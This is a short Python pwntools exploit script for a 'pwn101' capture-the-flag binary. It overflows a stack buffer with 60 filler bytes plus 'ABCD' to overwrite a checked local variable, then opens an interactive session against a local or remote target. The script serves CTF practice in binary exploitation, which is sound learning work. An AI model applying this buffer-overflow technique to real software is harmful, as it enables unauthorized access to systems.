from pwn import *
import sys

context.binary = exe = ELF("./pwn101.pwn101")
context.terminal = "konsole -e".split()

class Exploit:
    def __init__(self, p: process):
        self.p = p
    
    def debug(self, script):
        attach(self.p, script)
        
    def send(self, content):
        p = self.p
        p.sendlineafter(b"Type the required ingredients to make briyani:", content)

if sys.argv[1]:
    p = remote(sys.argv[1], sys.argv[2])
else:
    p = process()

x = Exploit(p)

payload = b""
payload += b"A"*60 # buffer to reach dword ptr [rbp - 4] in cmp in main+76
payload += b"ABCD"

# x.debug("break *main+76\nc")
x.send(payload)
p.interactive()